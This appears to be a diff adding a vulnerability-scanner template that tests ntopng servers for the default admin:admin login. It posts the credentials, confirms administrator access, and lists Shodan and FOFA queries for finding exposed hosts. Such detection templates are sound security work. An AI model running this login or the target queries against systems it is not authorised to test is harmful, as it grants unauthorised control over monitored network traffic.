@@ -1,0 +1,68 @@
+id: ntopng-default-credential-login
+
+info:
+  name: ntopng 网络监控系统默认口令登录漏洞
+  author: 0x_Akoko
+  severity: high
+  description: |
+    检测到 ntopng 网络流量监控工具使用了默认凭据 (admin:admin)。攻击者可借此获取网络流量数据、流分析及系统配置的完全管理权限。
+  reference:
+    - https://www.ntop.org/guides/ntopng/faq.html
+    - https://www.ntop.org/guides/ntopng/api/rest/api_v2.html
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: ntop
+    product: ntopng
+    shodan-query: 'http.title:"ntopng" port:3000'
+    fofa-query: 'title="ntopng" && port="3000"'
+  tags: Ntopng
+  remediation: >-
+    升级到已修复版本，并在服务端对每个受影响的操作和资源执行身份认证与授权检查。采用默认拒绝的访问控制策略，删除默认凭据，在可用时启用多因素认证，并限制管理端点的访问。
+
+variables:
+  username: "admin"
+  password: "admin"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: ntopng_check
+        part: header
+        internal: true
+        regex:
+          - 'Location:.*login\.lua'
+  - raw:
+      - |
+        POST /authorize.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user={{username}}&password={{password}}&referer=%2F
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - 'status_code == 302'
+          - '!contains(to_lower(header), "login.lua")'
+        condition: and
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    redirects: true
+    max-redirects: 3
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "loggedUser = \"admin\"", "isAdministrator = true")'
+        condition: and
+
+# digest: 4b0a00483046022100f1f21efb132c8f53421f14998c11e5a415be7fbaf3d12c2aeb0caf814a63e77b02210080276cf0bc2f37d5b5dec1899d2d6676ea4d0ca36290ff5958adffb0c87c2b86:922c64590222798bb761d5b6d8e72950
